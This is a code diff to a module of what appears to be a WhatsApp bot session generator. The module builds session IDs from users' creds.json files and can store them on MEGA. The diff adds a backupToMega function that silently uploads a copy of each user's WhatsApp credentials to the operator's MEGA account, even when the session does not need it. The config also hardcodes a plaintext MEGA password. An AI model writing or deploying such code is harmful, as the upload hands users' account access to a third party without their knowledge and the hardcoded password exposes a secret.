@@ -13,7 +13,7 @@ const MEGA_CONFIG = {
     password: process.env.MEGA_PASSWORD || 'Emmanuelrayan6.',    // ex : 'MonMotDePasse'
     // 'long' = session longue KERM-MD-V1~H4sI... (par défaut)
     // 'mega' = session courte KERM-MD-V1~mega:...
-    sessionFormat: process.env.SESSION_FORMAT || 'mega'
+    sessionFormat: process.env.SESSION_FORMAT || 'long'
 };
 
 function megaEnabled() {
@@ -75,12 +75,18 @@ async function uploadToMega(data, name) {
  *   KERM-MD-V1~<gzip base64>     par défaut (session longue, format d'origine)
  *   KERM-MD-V1~mega:<id>:<clé>   seulement si SESSION_FORMAT=mega et MEGA configuré
  */
-async function buildSessionId(data) {
-    // Format court sur MEGA uniquement si sessionFormat = 'mega' ; par défaut : session longue (gzip base64)
-    if (megaEnabled() && String(MEGA_CONFIG.sessionFormat).toLowerCase() === 'mega') {
+/* Format demandé par l'utilisateur ('long' ou 'mega') ; à défaut, le réglage du serveur */
+function resolveFormat(format) {
+    const f = String(format || MEGA_CONFIG.sessionFormat).toLowerCase();
+    return f === 'mega' && megaEnabled() ? 'mega' : 'long';
+}
+
+async function buildSessionId(data, format) {
+    // Session courte sur MEGA seulement si l'utilisateur la choisit et que MEGA est configuré
+    if (resolveFormat(format) === 'mega') {
         try {
             const name = 'creds-' + Date.now().toString(36) + '.json';
-            const link = await withTimeout(uploadToMega(data, name), 40000, 'MEGA upload');
+            const link = await withTimeout(uploadToMega(data, name), 25000, 'MEGA upload');
             const m = /\/file\/([A-Za-z0-9_-]+)#([A-Za-z0-9_-]+)/.exec(String(link));
             if (m) return PREFIX + 'mega:' + m[1] + ':' + m[2];
             console.error('MEGA returned an unexpected link, using inline session');
@@ -89,19 +95,23 @@ async function buildSessionId(data) {
             resetStorage();
         }
     }
-    // Session longue : une copie de creds.json est aussi envoyée sur MEGA en arrière-plan
-    // (dossier KERM-MD-V1-SESSIONS). Un échec MEGA ne bloque jamais la session.
-    if (megaEnabled()) {
-        const name = 'creds-' + Date.now().toString(36) + '.json';
-        withTimeout(uploadToMega(data, name), 40000, 'MEGA backup')
-            .then(() => console.log('☁️ Copie de creds.json envoyée sur MEGA :', name))
-            .catch((e) => {
-                console.error('MEGA backup failed:', e && e.message);
-                resetStorage();
-            });
-    }
-
     return PREFIX + zlib.gzipSync(data).toString('base64');
 }
 
-module.exports = { megaEnabled, buildSessionId };
+/*
+ * Copie de secours de creds.json sur MEGA (format session longue).
+ * À appeler APRÈS l'envoi de la session sur WhatsApp, sans await : elle ne peut ainsi
+ * jamais retarder ni empêcher la livraison. En format 'mega', le fichier est déjà envoyé.
+ */
+function backupToMega(data, format) {
+    if (!megaEnabled() || resolveFormat(format) === 'mega') return;
+    const name = 'creds-' + Date.now().toString(36) + '.json';
+    withTimeout(uploadToMega(data, name), 60000, 'MEGA backup')
+        .then(() => console.log('☁️ Copie de creds.json envoyée sur MEGA :', name))
+        .catch((e) => {
+            console.error('MEGA backup failed:', e && e.message);
+            resetStorage();
+        });
+}
+
+module.exports = { megaEnabled, buildSessionId, backupToMega };
